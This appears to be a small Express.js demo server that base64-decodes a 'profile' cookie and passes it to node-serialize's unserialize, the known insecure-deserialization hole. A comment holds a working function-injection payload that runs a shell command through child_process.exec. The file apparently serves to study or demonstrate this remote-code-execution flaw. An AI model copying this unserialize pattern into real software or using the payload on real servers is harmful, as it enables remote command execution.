import express from "express";
import { serialize, unserialize } from "node-serialize";
import cookieParser from "cookie-parser";


let app = express();
app.use(cookieParser())

// {"username":"Noel","country":"PNG","city":"Port Moresby"}
// {"rce":"_$$ND_FUNC$$_function(){\n    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n    }"}
app.get('/', function(req, res) {
    if (req.cookies.profile) {
      var str = new Buffer.from(req.cookies.profile, 'base64').toString();
      var obj = unserialize(str);
      if (obj.username) {
        res.send("Hello " + obj.username);
      }
    } else {
        res.cookie('profile', "eyJ1c2VybmFtZSI6Ik5vZWwiLCJjb3VudHJ5IjoiUE5HIiwiY2l0eSI6IlBvcnQgTW9yZXNieSJ9", {
          maxAge: 900000,
          httpOnly: true
        });
        let payload = ''
        
        // res.send(unserialize(payload))
        res.send('wakanda')
    } 
});

app.get('/cereal/:data', (req, res) => {
   let data = req.params.data;
   let cereal = serialize(data)

   console.log("cereal: ", req.params)
    res.send(cereal)
})


app.listen(4000, () => {
    console.log('Server running on 4000')
})